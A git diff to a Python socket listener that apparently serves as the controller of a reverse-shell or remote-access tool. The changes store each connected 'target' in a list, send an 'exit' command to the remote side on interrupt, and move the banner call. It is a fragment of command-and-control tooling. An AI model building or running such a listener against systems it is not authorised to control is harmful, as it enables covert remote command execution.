@@ -21,6 +21,10 @@ def listener_handler(): # Function to handle incoming connections and send bytes
     print('[+] Awaiting connection from client...')
     sock.listen()
     remote_target, remote_ip = sock.accept()
+    targets.append([remote_target,remote_ip])
+    print(targets)
+    print((targets[0])[0])
+    print((targets[0])[1])
     comm_handler(remote_target, remote_ip)
 
 def comm_in(remote_target):
@@ -48,8 +52,10 @@ def comm_handler(remote_target, remote_ip):
                 break
             print(response)
         except KeyboardInterrupt:
-            print(' [+] Keyboard interupt iniated...')
-            remote_target.close()
+            print('\n[-] Keyboard interupt iniated...')
+            message = 'exit'
+            remote_target.send(message.encode())
+            sock.close()
             break
         except Exception:
             remote_target.close()
@@ -58,9 +64,10 @@ def comm_handler(remote_target, remote_ip):
 
    
 if __name__ == '__main__':
+    targets = [] #store each socket connection
+    banner()
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     host_ip = args.ip
     host_port = args.p
-    banner()
     listener_handler()
 
